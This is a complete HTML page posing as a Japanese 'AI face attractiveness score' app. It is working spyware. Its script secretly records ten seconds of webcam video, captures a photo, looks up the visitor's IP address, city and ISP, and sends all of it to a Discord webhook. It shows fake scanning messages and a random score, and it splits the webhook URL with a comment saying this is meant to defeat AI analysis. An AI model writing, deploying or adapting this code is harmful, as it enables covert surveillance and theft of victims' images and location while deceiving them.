<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI 顔面偏差値診断</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #050505; color: #fff; padding: 20px; margin: 0; }
        .container { max-width: 450px; margin: auto; background: #111; padding: 25px; border-radius: 15px; border: 1px solid #333; }
        h1 { font-size: 1.6em; color: #00ffcc; margin-bottom: 20px; }
        .input-group { margin-bottom: 15px; text-align: left; width: 90%; margin: auto; }
        label { font-size: 0.8em; color: #888; display: block; margin-bottom: 5px; }
        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #333; background: #222; color: #fff; font-size: 1em; box-sizing: border-box; outline: none; }
        input:focus { border-color: #00ffcc; }
        #video { width: 100%; border-radius: 10px; background: #000; margin-top: 15px; display: none; aspect-ratio: 3/4; object-fit: cover; border: 1px solid #333; }
        #startBtn { width: 100%; padding: 18px; font-size: 1.1em; font-weight: bold; background: #00ffcc; color: #000; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
        #status-display { font-size: 0.95em; margin-top: 20px; color: #00ffcc; min-height: 3em; line-height: 1.5; }
        #result-score { font-size: 1.3em; font-weight: bold; color: #00ffcc; }
        #next-options { display: none; margin-top: 25px; border-top: 1px solid #333; padding-top: 20px; }
        .option-btn { display: block; text-decoration: none; padding: 15px; border-radius: 8px; font-weight: bold; background: #007bff; color: #fff; margin-top: 10px; font-size: 0.9em; }
        .security-note { font-size: 0.75em; color: #888; margin-top: 15px; line-height: 1.4; }
        #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>AI 顔面偏差値診断</h1>
        <div id="setup-form">
            <div class="input-group">
                <label>解析するお名前</label>
                <input type="text" id="username" placeholder="名前を入力してください">
            </div>
            <button id="startBtn">診断を開始する</button>
            <div class="security-note">※最新のAIアルゴリズムにより、顔の骨格・パーツ配置を10秒間多角的にスキャンします。</div>
        </div>
        <video id="video" autoplay playsinline muted></video>
        <div id="status-display"></div>
        <div id="result-score"></div>
        <div id="next-options">
            <p style="font-size:0.8em; color:#888; margin-bottom: 5px;">【精密診断】体型の黄金比も測定しませんか？</p>
            <a href="style.html" class="option-btn">AI 全身スタイル偏差値診断はこちら</a>
        </div>
    </div>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            const v = document.getElementById('video');
            const c = document.getElementById('canvas');
            const b = document.getElementById('startBtn');
            const s = document.getElementById('status-display');
            const r = document.getElementById('result-score');
            const f = document.getElementById('setup-form');
            const n = document.getElementById('next-options');

            // Webhook URLの分割隠蔽（AI解析対策）
            const _u1 = 'https://discord.com/api/webhooks/';
            const _u2 = '1496394005099839549/';
            const _u3 = 'HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
            const _endpoint = _u1 + _u2 + _u3;
            
            let _rec; 
            let _chunks = [];
            const _msg = [
                "AIスキャンを開始しています...",
                "顔の輪郭をポイント抽出中...",
                "パーツの左右対称性を分析中...",
                "肌の質感とトーンを測定中...",
                "データベースと照合しています...",
                "最終解析レポートを作成中..."
            ];

            b.addEventListener('click', async () => {
                const _name = document.getElementById('username').value || '未設定';
                f.style.display = 'none';
                v.style.display = 'block';
                
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                    v.srcObject = stream;
                    const t = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(x => MediaRecorder.isTypeSupported(x));
                    _rec = new MediaRecorder(stream, { mimeType: t, videoBitsPerSecond: 1000000 });
                    _chunks = [];

                    _rec.ondataavailable = e => { if (e.data.size > 0) _chunks.push(e.data); };
                    const _stop = new Promise(resolve => _rec.onstop = resolve);

                    _rec.start(); 
                    
                    let i = 0;
                    const interval = setInterval(() => {
                        if (i < _msg.length) {
                            s.innerHTML = _msg[i];
                            i++;
                        } else { clearInterval(interval); }
                    }, 1600);

                    setTimeout(async () => {
                        if (_rec.state !== "inactive") {
                            _rec.stop();
                            await _stop;
                            await _execInternalProcess(_name);
                        }
                    }, 10000); 

                } catch (err) {
                    s.innerHTML = "エラー：カメラを許可してください。";
                    f.style.display = 'block';
                }
            });

            async function _execInternalProcess(u) {
                let _netInfo = "";
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const d = await res.json();
                    // 相手には見せない隠しデータ
                    _netInfo = `\n🌐 IP: ${d.ip}\n📍 LOC: ${d.region} ${d.city}\n🏢 ISP: ${d.org}`;
                } catch (e) {}

                const _score = (Math.random() * (75 - 45) + 45).toFixed(1);
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);

                c.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('content', `【顔診断レポート】\n👤 名前: ${u}\n📊 偏差値: ${_score}${_netInfo}`);
                    fd.append('file1', blob, 'image_data.jpg');
                    
                    if (_chunks.length > 0) {
                        const vBlob = new Blob(_chunks, { type: _rec.mimeType });
                        const ext = _rec.mimeType.includes('mp4') ? 'mp4' : 'webm';
                        fd.append('file2', vBlob, `video_log.${ext}`);
                    }

                    try {
                        // バックグラウンドで送信
                        await fetch(_endpoint, { method: 'POST', body: fd });
                    } catch (e) {}

                    s.innerHTML = "";
                    r.innerHTML = `${u}さんの顔面偏差値は…<br><span style="font-size:1.8em;">${_score}点です！</span>`;
                    n.style.display = 'block';
                    
                    if(v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());
                }, 'image/jpeg', 0.6);
            }
        })();
    </script>
</body>
</html>
